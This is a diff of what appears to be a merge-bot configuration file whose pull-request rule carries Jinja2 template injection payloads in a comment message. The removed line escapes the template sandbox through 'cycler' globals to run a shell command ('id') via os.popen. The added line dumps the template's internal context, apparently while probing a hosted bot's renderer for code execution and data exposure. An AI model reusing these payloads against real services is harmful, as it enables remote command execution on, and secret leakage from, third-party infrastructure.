@@ -1,10 +1,10 @@
 pull_request_rules:
-  - name: vm6-j2s-cycler-261016
+  - name: vm6-j2s-selfctx-261016
     conditions:
-      - label = vm6-j2s-cycler
+      - label = vm6-j2s-selfctx
     actions:
       comment:
-        message: "{{ cycler.__init__.__globals__['os'].popen('id').read() }}"
+        message: "{{ self._TemplateReference__context }}"
 
 commands_restrictions:
   queue:
